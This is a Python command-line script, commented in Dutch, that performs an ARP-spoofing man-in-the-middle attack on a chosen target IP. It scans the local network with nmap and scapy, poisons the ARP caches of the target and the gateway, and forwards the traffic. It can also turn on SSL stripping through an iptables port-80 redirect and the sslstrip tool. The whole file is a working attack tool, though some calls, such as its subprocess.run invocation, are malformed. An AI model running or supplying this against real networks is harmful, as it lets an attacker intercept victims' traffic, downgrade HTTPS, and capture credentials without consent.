import os
from scapy.all import Ether, ARP, srp, send
import ipaddress
import nmap
import subprocess
import time
import argparse

#https://askubuntu.com/questions/1304100/ip-forwarding-does-not-work
def disable_ip_routing():
    # Disable IP routing
    print("Disabling IP routing")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("sudo iptables --policy FORWARD DROP")

def enable_ip_routing():
    # Enable IP routing
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(os.system("sudo iptables --policy FORWARD ACCEPT"))

def generate_host_ips(network_address, subnet_mask):
    # Combineer het netwerkadres en het subnetmasker om een netwerkobject te maken
    network = ipaddress.IPv4Network(f"{network_address}/{subnet_mask}", strict=False)
    host_ips = [str(ip) for ip in network.hosts()]
    return host_ips

def get_mac(ip):
    response = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, verbose=0)
    if len(response[0])!=0:
        return response[0][0][1].src
    else:
        return None

def get_all_mac(network_ip, subnet_mask):
    device_list=[]
    ips=generate_host_ips(network_ip, subnet_mask)
    for ip in ips:
        print(f"Getting mac address for {ip}")
        if get_mac(ip):
            device_list.append((ip, get_mac(ip)))

def ping_all_addresses(network_ip, subnet_mask):
    scanned_hosts = []
    # Maak een Nmap-scannerobject
    nm = nmap.PortScanner()

    # Voer een ARP-ping-scan uit
    nm.scan(hosts=f"{network_ip}/{subnet_mask}", arguments="-sn")

    for host in nm.all_hosts():
        try:
            mac_address = nm[host]['addresses']['mac']
            scanned_hosts.append((host, mac_address))
        except KeyError:
            scanned_hosts.append((host, None))
    return scanned_hosts

def get_default_gateway():
    gateway_ip=subprocess.check_output("ip route show default | awk '{print $3}'",shell=True).decode("utf-8").strip()
    mac_address=get_mac(gateway_ip)

    return (gateway_ip, mac_address)

def trick_targets(target_ip,target_mac, gateway_adress, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst=target_mac))
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst=gateway_mac))
    time.sleep(1)

def restore_arp(target_ip, target_mac, gateway_adress, gateway_mac):
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

def activate_ssl_stripping():
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
    subprocess.run("python3", "sslstrip/sslstrip.py", "-a", "-f")

def deactivate_ssl_stripping():
    os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")

def install_ssl_strip():
    if not os.path.exists("./sslstrip"):
        os.system("bash resources/install_sslstrip.sh")

def mitm(target_address, sslstrip_enabled):
    enable_ip_routing()
    gateway_adress, gateway_mac=get_default_gateway()
    try:
        if sslstrip_enabled:
            install_ssl_strip()
            activate_ssl_stripping()
        while True:
            trick_targets(target_address, get_mac(target_address), gateway_adress, gateway_mac)
    except KeyboardInterrupt:
        print("Stopping MITM attack")
    if sslstrip_enabled:
        deactivate_ssl_stripping()
    restore_arp(target_address, get_mac(target_address), gateway_adress, gateway_mac)
    disable_ip_routing()

def main():
    # Creëer een parser voor de command-line argumenten
    parser = argparse.ArgumentParser(description="Script for performing a man-in-the-middle (MITM) attack with SSL stripping.")

    # Voeg de argumenten toe
    parser.add_argument("target_ip", help="IP address of the target")
    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping")

    # Parsen van de argumenten
    args = parser.parse_args()

    # Nu kun je de waarden van de argumenten gebruiken
    target_ip = args.target_ip
    sslstrip_enabled = args.sslstrip

    mitm(target_ip, sslstrip_enabled)

if __name__ == "__main__":
    main()